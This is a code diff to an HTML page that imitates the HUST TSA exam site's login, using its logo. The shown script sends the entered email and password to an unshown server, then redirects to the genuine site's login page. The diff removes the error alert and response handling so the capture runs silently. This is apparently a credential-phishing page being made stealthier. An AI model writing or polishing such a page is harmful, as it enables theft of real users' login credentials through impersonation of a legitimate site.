@@ -10,7 +10,7 @@
         <div class="ant-row Exam_container__1-aEa">
             <div class="ant-col mt-6 ant-col-xs-24">
                 <div class="text-center">
-                    <img class="logo-kt mb-4 mt-4" alt="..." src="https://tsa.hust.edu.vn/static/media/logo-full.d53aeb71.svg" width="340px" height="32px" vsspace="100px" hsspace="100px">
+                    <img class="logo-kt mb-4 mt-4" alt="..." src="https://tsa.hust.edu.vn/static/media/logo-full.d53aeb71.svg" width="340px" height="32px">
                 </div>
             </div>
         </div>
@@ -76,13 +76,11 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ email, password })
         })
-        .then(response => response.json())
-        .then(data => {
+        .then(() => {
             window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng
         })
         .catch(error => {
             console.error("Lỗi khi gửi dữ liệu:", error);
-            alert("Không thể gửi thông tin đăng nhập! Kiểm tra lại server.");
         });
     });
 </script>
